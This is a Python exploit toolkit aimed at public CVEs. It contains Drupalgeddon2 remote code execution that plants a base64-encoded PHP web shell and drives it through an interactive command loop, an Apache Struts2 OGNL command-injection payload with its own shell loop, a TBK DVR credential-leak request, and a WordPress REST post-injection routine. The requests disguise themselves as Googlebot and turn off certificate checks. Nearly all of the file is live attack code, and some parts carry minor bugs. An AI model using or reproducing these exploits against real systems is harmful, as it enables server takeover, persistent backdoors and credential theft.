#-*- coding: utf-8 -*-
import requests,re
from bs4 import BeautifulSoup as bs
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class drupal_rce(object):


      def __init__(self,target):
          self.target = target
          self.user_agent = {'User-Agent':'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'}
          self.path = './sites/default/files'          
          self.shell = 'echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d >> '
          self.path_shell = ''
          
      def drupal7(self,cmd):
          '''
          Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
          CVE: 2018-7600          
          '''
          r = requests.post(
            self.target,
            params={
                'q':'user/register',
                'name[%23post_render][]':'passthru',
                'name[%23type]':'markup',
                'name[%23markup]': cmd                                 
            },
            data={
                'form_id':'user_pass',
                '_triggering_element_name':'name',
            },
            verify=False,
            headers=self.user_agent
          )
          build_id = re.findall('input type="hidden" name="form_build_id" value="(.*?)" /',r.text)[0]
          response = requests.post(
            self.target,
            params={
                'q':'file/ajax/name/#value/' + build_id
            },
            data={
                'form_build_id':build_id
            },
            verify=False,
            headers=self.user_agent
          )
          return response

      def upload_shell(self,version):
          if version == '7':
             upload = self.drupal7(f'mv -f {self.path}.htaccess {self.path}.htaccess-bak;{self.shell}{self.path}407.php;{self.shell}407.php')
             return upload                 
          elif version == '8':
             upload = self.drupal8(f'mv -f {self.path}.htaccess {self.path}.htaccess-bak;{self.shell}{self.path}407.php;{self.shell}407.php')
             return upload
          else:
             return None             
                                        
      def version(self):
          r = requests.get(self.target,verify=False,headers=self.user_agent)
          if r.headers.get('X-Generator') == 'Drupal 7 (http://drupal.org)':
             return '7'
          elif r.headers.get('X-Generator') == 'Drupal 8 (http://drupal.org)':
             return '8'
          else:
             return None
         
      
      def check_shell(self):
          path = [f'{self.target}/407.php',f'{self.target}/{self.path}/407.php']
          for x in path:
              r = requests.get(x,verify=False,headers=self.user_agent)
              if r.status_code == 200:
                 break
                 self.path_shell += r.url
              else:
                 pass
          
      def execute_shell(self,isi):
          while True:
                command = input('command:-$ ')
                if command == 'exit':
                   break
                else:
                   print(requests.get(isi+f'?c={command}',verify=False).text,headers=self.user_agent)
                   
      def drupal8(self,cmd):
          '''
          Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
          CVE: 2018-7600
          '''
          r = requests.post(
            self.target,
            params={
                'q':'user/register',
                'elememts_parents':'account/mail/%23value',
                'ajax_form':'1',
                '&_wrapper_format':'drupal_ajax'                
            },
            data={
                'form_id':'user_register_form',
                '_drupal_ajax': '1',
                'mail[a][#post_render][]':'passthru',
                'mail[a][#type]': 'markup',
                'mail[a][#markup]':cmd
            }
          )
          return r
    
class apache_struts2(object):
      '''
      Apache Struts 2.3.5 < 2.3.31 / 2.5 < 2.5.10 - Remote Code Execution
      CVE: 2017-5638
      '''

      def __init__(self,target):
          self.target = target
          self.uag = 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
                    
      def payload(self,cmd):
          payload = "%{(#_='multipart/form-data')."
          payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
          payload += "(#_memberAccess?"
          payload += "(#_memberAccess=#dm):"
          payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
          payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
          payload += "(#ognlUtil.getExcludedPackageNames().clear())."
          payload += "(#ognlUtil.getExcludedClasses().clear())."
          payload += "(#context.setMemberAccess(#dm))))."
          payload += "(#cmd='%s')." % cmd
          payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
          payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
          payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
          payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
          payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
          payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
          payload += "(#ros.flush())}"
          return payload
          
      def check(self):
          r = requests.get(
            self.target,
            headers = {
                'User-Agent':self.uag,
                'Content-Type': self.payload('whoami')               
            },
            verify=False
          )
          if len(r.text) < 40:
             return 'vuln'
          else:
             return 'not vuln'
             
      def execute_shell(self):
          while True:
                command = input('command:-$ ')
                if command == 'exit':
                   break
                else:
                   r = requests.get(
                    self.target,
                    headers = {
                        'User-Agent':self.uag,
                        'Content-Type':self.payload(command)
                    },
                    verify=False
                   )
                   print(r.text)

class TBK_DVR4104_DVR4216(object):
      '''
      TBK DVR4104 / DVR4216 - Credentials Leak
      CVE: 2018-9995
      '''
      def __init__(self,target,port=None):
          self.target = target
          self.port = port

      @property    
      def headers(self):      
          return {
            'Host':self.target,
            'User-Agent':'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;>',
            'Accept-Language':'es-AR,en-US;q=0.7,en;q=0.3',
            'Connection':'close',
            'Content-Type':'text/html',
            'Cookie':'uid=admin'
          }              
          
      def request_get(self):
          r = requests.get(
            f'{self.target}/device.rsp?opt=user&cmd=list',
            headers = self.headers
          )
          if r.status_code == 200:
             return r.json()
          else:
             return 'not vuln'


class wordpress_content_injection(object):

      def __init__(self,target):
          self.target = target          
          self.uag = 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
          
      def get_version(self):
          r = requests.get(
            self.target,
            headers = {'User-Agent':self.uag},
            verify=False
          )
          version = re.findall('ver=(.*?)"',r.text)
          if len(version) == 0:
             return 'not vuln'
          else:
             return version[0]
             
      def get_id(self):
          _id = []
          r = requests.get(
             f'{self.target}/wp/v2/posts',
             headers = {'User-Agent':self.uag},
             verify=False
          )
          for x in r.json():
              _id.append(x['id'])
          return _id
         
      def post_content(self,title,payload,post_id):    
          post_data = json.dumps({
             'title':title,
             'content':payload
          })
          headers = {
             'User-Agent':self.uag,
             'Content-Type':'Application-json'
          }
          r = requests.post(
             f'{self.target}/wp/v2/posts/{post_id}/?id={post_id}',
             data = post_data,
             headers = headers
          )
          return r
